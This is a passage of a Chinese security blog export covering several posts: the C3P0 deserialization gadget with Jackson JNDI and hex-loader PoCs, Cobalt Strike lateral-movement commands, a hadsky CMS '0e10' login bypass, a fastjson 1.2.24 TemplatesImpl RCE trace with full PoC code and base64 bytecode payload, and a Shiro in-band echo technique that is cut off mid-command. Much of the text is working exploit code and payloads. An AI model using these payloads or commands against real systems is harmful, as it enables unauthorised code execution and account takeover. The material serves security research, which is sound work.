* Arguments: * - base_url:classname * * Yields: * - Instantiation of remotely loaded class * * @author mbechler * */@PayloadTest ( harness=\"ysoserial.test.payloads.RemoteClassLoadingTest\" )@Dependencies( { \"com.mchange:c3p0:0.9.5.2\" ,\"com.mchange:mchange-commons-java:0.2.11\"} )@Authors({ Authors.MBECHLER })public class C3P0 implements ObjectPayload&lt;Object&gt; { public Object getObject ( String command ) throws Exception { int sep = command.lastIndexOf(':'); if ( sep &lt; 0 ) { throw new IllegalArgumentException(\"Command format is: &lt;base_url&gt;:&lt;classname&gt;\"); } String url = command.substring(0, sep); String className = command.substring(sep + 1); PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class); Reflections.getField(PoolBackedDataSourceBase.class, \"connectionPoolDataSource\").set(b, new PoolSource(className, url)); return b; } private static final class PoolSource implements ConnectionPoolDataSource, Referenceable { private String className; private String url; public PoolSource ( String className, String url ) { this.className = className; this.url = url; } public Reference getReference () throws NamingException { return new Reference(\"exploit\", this.className, this.url); } public PrintWriter getLogWriter () throws SQLException {return null;} public void setLogWriter ( PrintWriter out ) throws SQLException {} public void setLoginTimeout ( int seconds ) throws SQLException {} public int getLoginTimeout () throws SQLException {return 0;} public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;} public PooledConnection getPooledConnection () throws SQLException {return null;} public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;} } public static void main ( final String[] args ) throws Exception { PayloadRunner.run(C3P0.class, args); }} connectionPoolDataSource是PoolSource，但是PoolSource没有实现序列化接口，所以会在PoolBackedDataSource时进入到catch块中。 catch块中调用indirector.indirectForm(this.connectionPoolDataSource)会把Referenceable类型放到ReferenceSerialized中并进行序列化。 在反序列化时，会调用ReferenceSerialized的getObject方法，向http base请求类 jndi 注入PoolBackedDataSourceBase 123456789101112131415161718192021222324252627282930313233343536373839import com.fasterxml.jackson.databind.ObjectMapper;import java.io.*;class Person { public Object object;}public class TemplatePoc { public static void main(String[] args) throws IOException { String poc = \"{\\\"object\\\":[\\\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\\\",{\\\"jndiName\\\":\\\"rmi://localhost:8088/Exploit\\\", \\\"loginTimeout\\\":0}]}\"; System.out.println(poc); ObjectMapper objectMapper = new ObjectMapper(); objectMapper.enableDefaultTyping(); objectMapper.readValue(poc, Person.class); } public static byte[] toByteArray(InputStream in) throws IOException { byte[] classBytes; classBytes = new byte[in.available()]; in.read(classBytes); in.close(); return classBytes; } public static String bytesToHexString(byte[] bArray, int length) { StringBuffer sb = new StringBuffer(length); for(int i = 0; i &lt; length; ++i) { String sTemp = Integer.toHexString(255 &amp; bArray[i]); if (sTemp.length() &lt; 2) { sb.append(0); } sb.append(sTemp.toUpperCase()); } return sb.toString(); }} hex序列化字节加载器 在一些非原生的反序列化（如jackson）的情况下，c3p0可以做到不出网利用。其原理是利用jackson的反序列化时调用userOverridesAsString的setter，在setter中运行过程中会把传入的以HexAsciiSerializedMap开头的字符串进行解码并触发原生反序列化。 123456789101112131415161718192021222324252627282930313233343536373839404142434445import com.fasterxml.jackson.databind.ObjectMapper;import java.io.*;class Person { public Object object;}public class TemplatePoc { public static void main(String[] args) throws IOException { InputStream in = new FileInputStream(\"/Users/cengsiqi/Desktop/test.ser\"); byte[] data = toByteArray(in); in.close(); String HexString = bytesToHexString(data, data.length); String poc = \"{\\\"object\\\":[\\\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\\",{\\\"userOverridesAsString\\\":\\\"HexAsciiSerializedMap:\"+ HexString + \";\\\"}]}\"; System.out.println(poc); ObjectMapper objectMapper = new ObjectMapper(); objectMapper.enableDefaultTyping(); objectMapper.readValue(poc, Person.class); } public static byte[] toByteArray(InputStream in) throws IOException { byte[] classBytes; classBytes = new byte[in.available()]; in.read(classBytes); in.close(); return classBytes; } public static String bytesToHexString(byte[] bArray, int length) { StringBuffer sb = new StringBuffer(length); for(int i = 0; i &lt; length; ++i) { String sTemp = Integer.toHexString(255 &amp; bArray[i]); if (sTemp.length() &lt; 2) { sb.append(0); } sb.append(sTemp.toUpperCase()); } return sb.toString(); }} 简单跟踪一下，进入setter方法。 由parseUserOverridesAsString对字符串进行处理 提取HexAsciiSerializedMap之后的东西 最后由fromByteArray中的deserializeFromByteArray进行反序列化","link":"/2020/04/18/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget/"},{"title":"cobaltstrike在横向移动中的上线技巧","text":"cobaltstrike psexec在进行pexecz之前一般需要用rev2vself回到原来的回话和克隆token rev2self: Revert to your original access token make_token: Clone the current access token and set it up to pass the specified usernameand password when you interact with network resources. This command does notvalidate the credentials you provide and it has no effect on local actions. psexec: Spawn a session on a remote host. This command generates an executable, copies it to the target, creates a service to run it, and cleans up after itself. You must specify which share (e.g., ADMIN$ or C$) to copy the file to.123rev2selfmake_token administrator aaa123!@#psexec 192.168.20.30 ADMIN$ smb-bind-pipe smb-bind-pipe是建立的smb监听器的名字，创建smb监听器的时候会要求输入端口，不知道意义何在，随便填一个就好。 用这种方法上线的权限是系统权限 ps：后来看cs输出，填的端口号会是命名管道的一部分，这样好处就是可以在一个机器上开多个管道吧 cobaltstrike smb pipe其实上面psexec指定的是smb-bind-pipe listener，那么psexec成功后通信方式就是基于smb。使用smb的好处可以一定程度上规避流量审查。另外一种使用smb办法就是生成windows executes，在目标机器上运行然后link，这种方法拿到的就是，运行这个exe用户的权限而不是system权限。 Use: link [ip address]Link to the Beacon at the specified IP address. ps:在使用unlink的时候smb pipe都会断掉，但是smb pipe的进程并不会退出，link两次后通过psexec和运行exe的shell都会恢复 cobaltstrike bind tcp建立listener后和smb一样，可以用psexec 123rev2selfmake_token administrator aaa123!@#psexec 192.168.20.30 ADMIN$ bind-tcp 也可以生成exe，然后使用connect连接 1connect 192.168.20.30 需要说明的是创建监听器的时候填写的端口并没有什么用实际监听的时候还是监听的4444端口 加上smb，和tcp，拓扑图如下，蓝色是tcp，黄色是smb ps：smb和tcp的相同点在于，unlink会同时断掉tcp和smb会话，不同点在于smb可以通过link连接回来，但是connect无法连接回来tcp，原因在于unlink后smb类型进程还是存在，但是tcp的unlink后进程会退出。 cobaltstrike reverse tcpcs3.13之后新更新的一个listener，相当nice的一点是Linux跳板机上也支持这种操作，不过在创建listener的时候并不会出现。 找到它需要在 命令行如下 12345678rportfwd 23333 windows/beacon_reverse_tcpUse: rportfwd [bind port] [forward host] [forward port] rportfwd stop [bind port]Binds the specified port on the target host. When a connection comes in,Cobalt Strike will make a connection to the forwarded host/port and use Beaconto relay traffic between the two connections. 比较“奇怪“的是，这个监听器不能在psexec的执行，只能在生成stageless的时候找到 上线可以看到反向的绿色线，这种方法有个弊端，因为监听的端口往往不是默认放行的端口，所以要求边界机器要关闭防火墙。。。 ps：reverse同样受到unlink的影响 参考Cobalt Strike几种不那么常见的上线方式小记","link":"/2019/11/22/cobaltstrike%E5%9C%A8%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E4%B8%8A%E7%BA%BF%E6%8A%80%E5%B7%A7/"},{"title":"hadsky部分用户任意登录","text":"漏洞利用过程在注册页面 注册用户 密码为password 其他信息随便填 在登陆框以用户名0e10（万能用户名） 密码password登录 成功登陆 漏洞产生原因该cms有三种登陆方式 用户UID 邮箱 用户名 代码如下 \\upload\\phpscript\\checklogin.php 第6行 123456789101112131415if (Cnum($_POST['username'])) { //UID登录 $__ud = $_G['TABLE']['USER'] -&gt; getData($_POST['username']); $username = $__ud['username'];} elseif (strpos($_POST['username'], '@')) { //邮箱登录 $__ud = $_G['TABLE']['USER'] -&gt; getData(array('email' =&gt; $_POST['username'])); $username = $__ud['username']} else { //用户名登录 preg_match('/^[\\x{4e00}-\\x{9fa5}A-Za-z0-9_]+$/u', $_POST['username']) ? $username = $_POST['username'] : $username = FALSE; if (strlen($username) &gt; 24 || strlen($username) &lt; 3) { $username = FALSE; }} 这里会首先进入Cnum()函数检查 1234567891011121314151617function Cnum($str, $return = 0, $int = true, $min = FALSE, $max = FALSE) { if (is_numeric($str)) { //0e10在这里进入 if ($int) $str = (int)$str; } else { $str = $return; } if ($min !== FALSE) if ($str &lt; $min) $str = $return; if ($max !== FALSE) if ($str &gt; $max) $str = $return; return $str; //return 0} 这个函数的功能是检验是否位数字,0e10的用户名经过is_numberic()判断returu，最后int()后，以 return 0返回 问题就出在这里 if (Cnum($_POST[‘username’])) 看到返回值是0会认为他不是数字（实际上是的嘛只是科学记数法而已）,于是绕过UID登录方式，0e10显然也不符合邮箱格式，于是进入else被当成了用户名来验证。0e10符合用户名的格式，于是接下来进入用户存在性检验。 \\upload\\phpscript\\checklogin.php 第25行 12if (!$username || !$password) $chkr = '请填入正确的登录信息'; 如果开始直接输入0，会在这里报错，但是0e10不会目测PHP弱类型的原因~ \\upload\\phpscript\\checklogin.php 第34行 12//检验数据库中是否有相应用户名$trylogindata = $_G['TABLE']['USER'] -&gt; getData(array('username' =&gt; $username)); 跟进getData() 123456789public function getData($field = NULL, $str = NULL) { /*省略*/ if (Cnum($field, FALSE)) { $sql = \"where `id`={$field}\"; } else { $sql = $this -&gt; getSql($field, $str); } $query = mysql_query(\"select * from `{$this-&gt;mysql_prefix}{$this-&gt;table}` {$sql}\");}/*省略*/ 跟进getSql() 12345678public function getSql($field, $str = NULL) { /*省略*/ } elseif (is_array($field) &amp;&amp; $str == NULL) { foreach ($field as $key =&gt; $value) { if (Cstr($key, FALSE, TRUE, 1, 255)) $sql .= \"`{$key}`=\" . mysqlstr($value) . \" and \";//无引号保护 }}/*省略*/ 这里mysqlstr($value)没有引号保护直接拼接进去，最终执行SQL语句如下 12if ($trylogindata) { /*$trylogindata为真则进入用户密码检验*/ 由于MYSQL的弱类型的关系（0=任何字符串）因为username字段是是字符串，所以只要数据库里有一条数据，那么getData(array('username' =&gt; $username));就会返回数据给$trylogindata \\upload\\phpscript\\checklogin.php 第52行 12if ($trylogindata) { /*$trylogindata为真则进入用户密码检验*/ 由于$trylogindata存在，所以进入if语句 \\upload\\phpscript\\checklogin.php 第52行 12//检验密码是否正确$userdata = UserLogin(array('username' =&gt; $username, 'password' =&gt; md5($password))); 跟进UserLogin() 1234function UserLogin($chkuserloginarray, $chkloginqx = true) { global $_G; $userdata = $_G['TABLE']['USER'] -&gt; getData($chkuserloginarray); /**省略**/ 这里检验用户名，密码依然是getData()函数 最后执行SQL语句就是 1select * from `pk_user` where `username`=0e10 and password = 'xxxxxxxxx' 所以只要数据库中存在密码，就能登陆拥有相应密码的第一个用户（万能用户名）。 一句话总结：未加引号保护时，MYSQL+PHP弱类型引起的登陆逻辑漏洞 最后1、厂商原话：系统开源的，也希望大家多多支持，能把发现的问题发给我 2、个人能力有限，如有错误还请师傅们多多指教","link":"/2017/08/17/hadsky%E9%83%A8%E5%88%86%E7%94%A8%E6%88%B7%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95/"},{"title":"fastjson 反序列化流程硬核跟踪","text":"环境搭建pom.xml 1234567891011121314151617181920212223242526272829&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.lisan&lt;/groupId&gt; &lt;artifactId&gt;learnfastjson&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.24&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-codec&lt;/groupId&gt; &lt;artifactId&gt;commons-codec&lt;/artifactId&gt; &lt;version&gt;1.10&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-io&lt;/groupId&gt; &lt;artifactId&gt;commons-io&lt;/artifactId&gt; &lt;version&gt;2.3&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; Poc.java 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;import com.alibaba.fastjson.parser.ParserConfig;import org.apache.commons.io.IOUtils;import org.apache.commons.codec.binary.Base64;import java.io.ByteArrayOutputStream;import java.io.File;import java.io.FileInputStream;import java.io.IOException;/** * Created by web on 2017/4/29. */public class Poc { public static String readClass(String cls){ ByteArrayOutputStream bos = new ByteArrayOutputStream(); try { IOUtils.copy(new FileInputStream(new File(cls)), bos); } catch (IOException e) { e.printStackTrace(); } return Base64.encodeBase64String(bos.toByteArray()); } public static void test_autoTypeDeny() throws Exception { ParserConfig config = new ParserConfig(); final String fileSeparator = System.getProperty(\"file.separator\"); final String evilClassPath = System.getProperty(\"user.dir\") + \"/target/classes/Test.class\"; String evilCode = readClass(evilClassPath); final String NASTY_CLASS = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"; String text1 = \"{\\\"@type\\\":\\\"\" + NASTY_CLASS + \"\\\",\\\"_bytecodes\\\":[\\\"\"+evilCode+\"\\\"],'_name':'a.b','_tfactory':{ },\\\"_outputProperties\\\":{ },\" + \"\\\"_name\\\":\\\"a\\\",\\\"_version\\\":\\\"1.0\\\",\\\"allowedProtocols\\\":\\\"all\\\"}\\n\"; System.out.println(text1); Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); //assertEquals(Model.class, obj.getClass()); } public static void main(String args[]){ try { test_autoTypeDeny(); } catch (Exception e) { e.printStackTrace(); } }} Test.java 12345678910111213141516171819202122232425import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(&quot;open /Applications/Calculator.app&quot;); } public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } public static void main(String[] args) throws Exception { Test t = new Test(); }} 代码跟踪TemplatesImpl.class的寻找触发点，一定要传入Feature.SupportNonPublicField否则后面不会为非公有字段添加反序列化器（后面会再提到） 步入 com.alibaba.fastjson.JSON#parseObject:181 步入 com.alibaba.fastjson.JSON#parseObject:190从全局来看整个反序列化将在下面parseObject进行，其大致顺序是 配置反序列化时启用的特性，比如是否允许反序列化非公有字段 获取一个json的词法分析对象parser 用parser分析传入进来的json字符串，进行反序列化。 /com/alibaba/fastjson/JSON.class:199 先来细看DefaultJSONParser创建过程，先执行类初始化方法（略）。 然后执行对象的构造方法。/com/alibaba/fastjson/parser/DefaultJSONParser.class:98 执行构造方法的时候又会新建一个JSONScanner类，JSONScanner类的生成同样先是执行类初始化（略） 然后是对象父类的初始化 子类的初始化/com/alibaba/fastjson/parser/JSONScanner.class:28 然后回到DefaultJSONParser中执行构造方法，需要特别说明是初始化的时候将因为传入的json是{开头，所以将token设置为了12，随着词法分析进行token进行会一直改变，token不一样意味着解析接下来json的策略也会变。token与字符的关联关系定义在com.alibaba.fastjson.parser.JSONTokencom.alibaba.fastjson.parser.DefaultJSONParser#DefaultJSONParser 构造方法完成后意味着宏观来看的前两步也完成了，此时拿到词法分析器parser/com/alibaba/fastjson/JSON.class:203 接着进入从全局来看的最后一步（下面写的所有都是从最后一步展开分析）。调用parser的parseObject方法反序列化json。这里type是在写在Poc中的Object.class，这里的config是在Poc中new的ParserConfig，根据传入的类类型的不同，config会返回不同的反序列化器。com.alibaba.fastjson.parser.DefaultJSONParser#parseObject:575 先检查传入的type是不是(泛型)数组类型，最后又回到DefaultJSONParser的parsercom.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer.class#deserialze:42 parser方法根据token的不同case到不同分支里面，开始的时候提到了，在创建DefaultJSONParser的时候token设置为了12。com.alibaba.fastjson.parser.DefaultJSONParser.class#parse:1295 case 12，主要进行的操作是提去出@type对应的类，并获取到类对象即TemplatesImpl。com.alibaba.fastjson.parser.DefaultJSONParser#parseObject 这里将token设置为了16（意味着json合法情况下，下一个符号是逗号） 根据TemplatesImpl类对象，寻找针对TemplatesImpl的反序列化器，之所以要找新的反序列化器是为了后续反序列化TemplatesImpl的字段。 找TemplatesImpl.class对应的反序列化器的任务还是委托给config，但是显然config并没有专门对付TemplatesImpl的反序列化器，所以走到了最后一个if条件，即把TemplatesImpl当作一个Java Bean来看并待根据TemplatesImpl实际情况定制一个JavaBeanDeserializer。com/alibaba/fastjson/parser/ParserConfig.class:411 定制一个的JavaBeanDeserializer来反序列化TemplatesImpl.class细看一下TemplatesImpl版的JavaBeanDeserializer定制过程。 一来先构建一个beaninfocom.alibaba.fastjson.parser.ParserConfig.class#createJavaBeanDeserializer:480 beaninfo构建的目的主要是拿到TemplatesImpl满足条件的getter、setter对应的Field和无参构造方法。获取这些办法就是常规的内省操作。 内省重点是满足条件的getter和settercom.alibaba.fastjson.util.JavaBeanInfo.class#build:318 方法名长度大于4 &amp;&amp; 非静态函数 &amp;&amp; 返回类型为void或当前类 &amp;&amp; 参数个数为1个 &amp;&amp; 以set开头 com.alibaba.fastjson.util.JavaBeanInfo.class#build:458 方法名长度大于等于4 &amp;&amp; 非静态方法 &amp;&amp; 以get开头且第4个字母为大写 &amp;&amp; 无参数 &amp;&amp; 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong 找到getter setter对应的字段后，会把字段名、字段对应的方法、类对象等打包成fieldInfo并add到FieldList中 最后用内省拿到的各种东西去构建JavaBeanInfocom.alibaba.fastjson.util.JavaBeanInfo.class#build:480 构建JavaBeanInfo中有一步中的操作是把FiledInfo排序，排序之后后面要用到FileList的内容直接二分法拿。com.alibaba.fastjson.util.JavaBeanInfo#JavaBeanInfo:70 JavaBeanInfo构建好会遍历其filedLIst查看是否有getOnly的方法，如果有的话后面就不会用asm的方法创建（对asm不了解，查网上资料是这么说的：获取java bean的属性值，需要调用反射，fastjson引入了asm的来避免反射导致的开销。）这里很不幸，getOutputProperties属于getOnly方法（至于为什么是getOnly简单跟踪一下FiledInfo创建过程就知道了，这里不再展开） 所以这里最后会用非asm的方法创建JavaBeanDeserializer，用人话说就是直接new JavaBeanDeserializercom.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer JavaBeanDeserializer构造方法中又把刚才拿到beaninfo的操作重复了一遍（上面已经跟过了这里也不重复跟踪）。com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.class#JavaBeanDeserializer:50 JavaBeanDeserializer在构造方法中会为每一个Bean字段创建一个反序列化器，并把反序列化器放到sortedFieldDeserializers中com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.class#JavaBeanDeserializer:64 这个反序列化器默认情况下是DeafultFiledDeserializercom.alibaba.fastjson.parser.ParserConfig.class#createFieldDeserializer:565 最后会把JavaBeanDeserializer的Teamplaytesimpl方法到反序列化器的序列中（如果后面其它也要用就不用重新创建一次了） 至此JavaBeanDeserializer定制完成，下面就开始正式反序列化TemplatesImpl JavaBeanDeserializer.deserialzedeserialze往下跟几步会进入label1064，从宏观来看主要的操作都在label1064和其子label中，做了以下这几件事情。 创建TemplatesImpl对象 继续读取json字符串内容 用字段的反序列化器把读到内容set到TemplatesImpl对象中 第一步创建TemplatesImpl对象/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.class:579 第二步根据从json字符串读出的key，反序列化对应字段/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.class:606 往下跟的话之前设置的Feature.SupportNonPublicField.mask在这里就发挥作用了，如果没有这个在TemplatesImpl这条链中_bytecodes因为是私有字段的原因最后就不会被反序列化。SupportNonPublicField选项会把所有字段的反序列化器全部生成并放到extraFieldDeserializers中。com.alibaba.fastjson.parser.DefaultJSONParser:747 第三步到了最后的时刻，好戏上演。最后一步从局部宏观来看还可再细分为三步1.获取直接和字段值打交道的反序列化器fieldValueDeserilizer2.反序列化拿字段对象3.把字段对象set到object中（如果字段对象的fieldInfo是getOnly，则会反射调用getter方法，从微观来讲RCE问题出在这个地方） 以_bytecodes为例第一步 没啥好说的依旧通过config类获取对应的反序列化器 第二步 fieldValueDeserilizer是ObjectArrayCodec，负责把base64编码解码 第三步 就是把拿到的值放到TemplatesImpl对象中了 _name，_tfactory，_outputProperties的反序列化大同小异 说法在反序列化_outputProperties的时候 在第三步setValue的时候，因为_outputProperties是getOnly的所以进入不一样的分支，并触发它相应的get方法即getOutputProperties，最后会触发Test的无参数构造方法。 因为本文主要想描述fastjosn的大致流程，后面和反射部分和fastjson关联性不大了，就不细跟了。不过如果细跟的话就会发现为啥payload是这么构造。（json中看似多余字段为啥要加，为啥要继承AbstractTranslet等等，说白了就是如果不这样进入不了触发无参构造器的分支）。 杂想弄懂整体流程，弄懂每个大流程下的小流程，弄懂流程之间参数的勾连关系。从代码上来说，从功能来说。从大流程上来说，从大流程中小流程来说。套路或者说定性的规律 附fastjson的黑名单https://github.com/LeadroyaL/fastjson-blacklist token对应表12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** 1 关联到 error */public final static int ERROR = 1;/** 2 关联到 int */public final static int LITERAL_INT = 2;/** 3 关联到 float */public final static int LITERAL_FLOAT = 3;/** 4 关联到 string */public final static int LITERAL_STRING = 4;/** 5 关联到 iso8601 */public final static int LITERAL_ISO8601_DATE = 5;/** 6 关联到 true */public final static int TRUE = 6;/** 7 关联到 false */public final static int FALSE = 7;/** 8 关联到 null */public final static int NULL = 8;/** 9 关联到 new */public final static int NEW = 9;/** 10 关联到 ( */public final static int LPAREN = 10;/** 11 关联到 ) */public final static int RPAREN = 11;/** 12 关联到 { */public final static int LBRACE = 12;/** 13 关联到 } */public final static int RBRACE = 13;/** 14 关联到 [ */public final static int LBRACKET = 14;/** 15 关联到 ] */public final static int RBRACKET = 15;/** 16 关联到 , */public final static int COMMA = 16;/** 17 关联到 : */public final static int COLON = 17;/** 18 关联到 ident */public final static int IDENTIFIER = 18;/** 19 关联到 fieldName */public final static int FIELD_NAME = 19;/** 20 关联到 EOF */public final static int EOF = 20;/** 21 关联到 Set */public final static int SET = 21;/** 22 关联到 TreeSet */public final static int TREE_SET = 22;/** 23 关联到 undefined */public final static int UNDEFINED = 23; // undefined/** 24 关联到 ; */public final static int SEMI = 24;/** 25 关联到 . */public final static int DOT = 25;/** 26 关联到 hex */public final static int HEX = 26; payload1{&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADEANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMVGVzdDsBAApFeGNlcHRpb25zBwAsAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAIAAkHAC8MADAAMQEAIW9wZW4gL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAwAMgAzAQAEVGVzdAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAsAAAAOAAMAAAAKAAQACwANAAwADAAAAAwAAQAAAA4ADQAOAAAADwAAAAQAAQAQAAEAEQASAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAQAAwAAAAgAAMAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAFQAWAAIADwAAAAQAAQAXAAEAEQAYAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAAUAAwAAAAqAAQAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAGQAaAAIAAAABABsAHAADAA8AAAAEAAEAFwAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAXAAgAGAAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA==&quot;],'_name':'a.b','_tfactory':{ },&quot;_outputProperties&quot;:{ },&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;} notelexer的np代表开始位置的偏移量，bp表示结束位置的偏移量，每next一次bp就加一，sp是相较于np而言的偏移量。 参考fastjson 远程反序列化poc的构造和分析FastJson 反序列化学习Fastjson 流程分析及 RCE 分析FastJson反序列化解析流程Fastjson反序列化漏洞 1.2.24-1.2.48Java中Type接口与Class类的区别联系Type 接口【重要】秒懂 Java注解类型（@Annotation）fastjson深度源码解析","link":"/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/"},{"title":"linux下java反序列化通杀回显方法的低配版实现","text":"首发于先知转载到自己博客 故事的起因一直觉得shiro反序列化是一个很舒服的洞，payload原生加密（无特征），实战中有概率遇见并且又是java反序列化洞所以危害又很大。不过尽管这样shiro打起来依然有java反序列化的两个痛点。第一是可用的gadget，第二个带内回显的问题。不过某天在刷tw的时候发现第二个痛点国内已经有大佬有成熟解决方案了。 注意看图，shiro的回显并不在http响应包中而是在http响应包之前，很玄学的回显对吧？联想最近在看了一篇文章通杀漏洞利用回显方法-linux平台，按我的理解这篇文章的思路大致是通过java反序列化执行代码&amp;&amp;系统命令获取到发起这次请求时服务端socket的文件描述符，然后在文件描述符写入回显内容。上图的回显效果和这种思路非常相似。 技术的难点实现这种技术的难点在于如何通过java反序列化执行代码&amp;&amp;系统命令获取本次http请求用到socket的文件描述符。因为在服务器对外开放的时会有fd下会有许多socket描述符。这里给出获取socket文件描述符我的一个低配版思路及实现，至于为啥是低配版会在文章最后提到。首先注意到socket后面的数字不同，这个数字实际上是inode号。这个inode号也出现在/proc/net/tcp中。注意到每一个inode号对应唯一条tcp连接信息并且这条信息中的remote_address项记录了远程连接的ip和端口号。说到这里其实获取socket思路就很明显了：通过指定客户端发起请求的源端口号，通过cat grep awk组合大法在tcp表中拿到inode，把拿到的inode号再去fd目录下再用cat grep wak大法拿到文件描述符的数字，再调用java代码打开文件描述符即可实现带内回显。 实现细节指定端口号requests库可以重新实现Http达到指定请求端口的目的。 1234567891011121314class SourcePortAdapter(HTTPAdapter): \"\"\"\"Transport adapter\" that allows us to set the source port.\"\"\" def __init__(self, port, *args, **kwargs): self._source_port = port super(SourcePortAdapter, self).__init__(*args, **kwargs) def init_poolmanager(self, connections, maxsize, block=False): self.poolmanager = PoolManager( num_pools=connections, maxsize=maxsize, block=block, source_address=('', self._source_port))s = requests.Session()s.mount(target, SourcePortAdapter(randNum))resp = s.get(target, cookies={'rememberMe': base64_ciphertext.decode()}, timeout=5, headers=headers, verify=False) 获取socket对应的文件描述符整个流程使用的命令如下 123a=`cat /proc/$PPID/net/tcp6|awk 